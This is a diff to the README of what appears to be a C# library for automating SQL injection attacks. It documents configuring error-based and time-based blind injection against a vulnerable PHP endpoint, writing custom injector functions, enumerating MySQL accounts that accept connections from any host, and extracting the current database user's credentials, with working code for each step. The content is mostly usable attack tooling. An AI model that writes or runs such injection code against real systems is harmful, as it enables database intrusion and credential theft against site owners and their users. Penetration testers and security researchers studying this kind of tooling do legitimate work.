@@ -17,7 +17,12 @@ IServiceCollection services = new ServiceCollection();
 services.AddLogging(options => options.AddConsole().SetMinimumLevel(LogLevel.Trace));
 services.AddSqlInjection(
     database => database.UseMySql(),
-    attack => attack.UseTimeBased(...)
+    attack => attack.UseErrorBased(
+        builder => builder.Create("http://localhost/vulnerable.php")
+            .IntoQueryStringParameter("id", initialValue: 1),
+        errorProvider => errorProvider.UseExponentiationOverflow(),
+        errorDetection => errorDetection.UsePhp()
+    )
 );
 
 IServiceProvider provider = services.BuildServiceProvider();
@@ -59,28 +64,74 @@ var password = await injection.Context.Current.GetTable(usersTable)
 ## Set up an attack
 
 ### Time-based blind attacks
-You have to implement the function to inject the SQL query and set the initial values for the timing attack.
+You can configure the exact timings for a time attack:
 
 ```csharp
 services.AddSqlInjection(
     database => database.UseMySql(),
-    attack => attack.UseTimeBased(new TimeBasedBlindSqlInjectionOptions
-    {
-        InjectAsync = InjectAsync,
-        InjectedWaitTime = TimeSpan.FromMilliseconds(1000),
-        SuccessfulTime = TimeSpan.FromMilliseconds(500),
-    }
+    attack => attack.UseTimeBased(
+        builder => builder.Create(...),
+        new TimeBasedBlindSqlInjectionOptions
+        {
+            InjectedWaitTime = TimeSpan.FromMilliseconds(1000),
+            SuccessfulTime = TimeSpan.FromMilliseconds(500),
+        }
+    )
 );
+```
 
-static async Task InjectAsync(string sql)
-{
-    await http.GetAsync($"/vulnerable.php?param={Uri.EscapeUriString(sql)}");
-}
+### Error-based attacks
+You can configure how to raise errors and how to detect them:
+
+```csharp
+services.AddSqlInjection(
+    database => database.UseMySql(),
+    attack => attack.UseErrorBased(
+        builder => builder.Create(...),
+        errorProvider => errorProvider.UseExponentiationOverflow(),
+        errorDetection => errorDetection.UsePhp()
+    )
+);
 ```
 
 ### Boolean-based attacks
 
 TODO
+
+
+## Set up the injector function
+
+This is the function which injects the generated SQL queries into the vulnerable system. For most cases, you can use the built-in builder:
+
+```csharp
+attack => attack.UseTimeBased(
+    builder => builder.Create("http://localhost/vulnerable.php")
+        
+        // location
+        .IntoRouteParameter(initialValue: "slug")
+        .IntoQueryStringParameter("id", initialValue: 1)
+
+        // HTTP method
+        .UseGet()
+        .UsePost()
+        .UseHttpMethod(HttpMethod.Put)
+)
+```
+
+If you can't build the injection function using the built-in configurations, you can build your own by implementing the corresponding interfaces:
+
+
+```csharp
+class CustomInjector : IErrorBasedInjector
+{
+    public CustomInjector(HttpClient http) { /*...*/ }
+
+    public Task<HttpResponseMessage> InjectAsync(string sql, CancellationToken cancellationToken)
+    {
+        return Http.GetAsync(/*...*/);
+    }
+}
+```
 
 ## The data context
 
@@ -99,8 +150,8 @@ Since the schema of every database can be different, entities are dynamic. You c
 
 ```csharp
 .OrderBy(u => u["email"]) // string
-.OrderBy(u => u.String("email")) // string
-.OrderBy(u => u.Integer("id")) // int
+.OrderBy(u => u.Value<string>("email")) // string
+.OrderBy(u => u.Value<int>("id")) // int
 ```
 
 ### Another database
@@ -122,7 +173,22 @@ var tables = await injection.Context.InformationSchema.Tables
 
 ### MySQL database
 
-TODO
+You can query users that are allowed to connect from anywhere:
+
+```csharp
+var users = await injection.Context.MySql.User
+    .Where(t => t.Host == "%")
+    .Where(t => t.AccountLocked == false)
+    .Select(t => t.Name)
+    .ToListAsync();
+```
+
+You can also get the credentials of the current database user:
+
+```csharp
+var user = await injection.Context.MySql.GetDatabaseUserNameAsync();
+var password = await injection.Context.MySql.GetDatabasePasswordAsync();
+```
 
 ## Functions
 
@@ -135,10 +201,10 @@ using static MySqlFunctions;
 And then you can easily access them in a query:
 
 ```csharp
-.Select(d => If(Ascii(Substring(Database(), 1, 1)).Between(97, 122), NULL, Sleep(1)))
+.Select(d => If(Ascii(Substring(Database(), 1, 1)).Between(97, 122), null, Sleep(1)))
 ```
 
-## Rendering queries
+## Altering query format
 You can create and register your own SQL writer:
 
 ```csharp
